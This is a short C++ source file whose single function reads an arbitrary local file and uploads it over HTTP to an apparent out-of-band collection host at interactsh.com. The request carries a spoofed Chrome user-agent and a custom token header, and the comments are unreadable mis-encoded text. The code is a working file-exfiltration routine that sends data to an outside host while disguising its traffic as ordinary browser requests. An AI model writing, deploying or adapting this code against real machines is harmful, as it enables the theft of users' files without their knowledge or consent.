#include <iostream>
#include<httplib.h>
using namespace std;
void Post(string file_path)
{

    httplib::Client cli("c5x6g182vtc0000dds30gddo53ayyyyym.interactsh.com", 80);//��ȡ��վ
    //��ȡ�ļ�ת������
    //ifstream file_stream("C:\\Users\\ascotbe\\Desktop\\1.png", ios::binary);
    ifstream file_stream(file_path, ios::binary);
    ostringstream string_stream;
    string_stream << file_stream.rdbuf();
    string content = string_stream.str();
    file_stream.close();
    httplib::MultipartFormDataItems items = { { "file", content,"1.png", "application/octet-stream" } };//psot���ݰ�����
    httplib::Headers headers = {
        { "Accept-Encoding", "gzip, deflate" },
        {"User-Agent","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"},
        {"Content-Type","multipart/form-data;" },
        { "token", "fuck" }
    };//�Զ�������ͷ
    auto res = cli.Post("/person", headers, items);//��������

    if (res->status == 200) //���󷵻�״̬��
    {
        cout << res->body << std::endl;//����ֵ
    }
}